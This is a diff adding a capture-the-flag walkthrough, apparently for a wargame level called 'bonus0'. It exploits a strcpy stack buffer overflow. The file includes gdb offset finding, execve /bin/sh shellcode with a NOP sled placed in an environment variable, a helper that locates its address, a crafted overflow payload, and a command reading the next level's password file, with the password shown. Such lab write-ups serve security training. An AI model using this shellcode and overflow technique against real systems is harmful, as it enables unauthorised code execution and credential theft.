@@ -1,0 +1,49 @@
+# Call to strcpy which is vulnerable to Buffer Overflow
+=> 0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>
+
+# Let's find a which offset the program segfault
+gdb> pattern create 100
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+gdb> r
+ -
+ AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
+ -
+ AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
+SIGSEGV
+gdb> pattern search
+[...]
+Registers contain pattern buffer:
+EBP+0 found at offset: 9
+EIP+0 found at offset: 13
+[...]
+
+# Now we need to know if the offset correspond to the first or the second string
+gdb> r
+ -
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+ -
+AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
+SIGSEGV
+# We know the offset correspond to the 2nd string
+
+# We export our shellcode
+$> export SHELLCODE=$(python -c "print '\x90'*64+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")
+
+# We write a small program to find address of environment variables
+$> cat getenv.c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[])
+{
+	printf("%s is at %p\n", argv[1], getenv(argv[1]));
+}
+$> gcc getenv.c -o getenv; ./getenv SHELLCODE
+SHELLCODE is at 0xbffff94a
+
+# Now the problem is how send data to `read` two time using a single file
+# We just need to fill the first buffer
+$> python -c "print 'A'*4095 + '\n' + 'B'*9 + '\x4a\xf9\xff\xbf' + 'C'*50" > /tmp/payload_bonus0
+$> cat /tmp/payload_bonus0  - | ./bonus0
+> cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
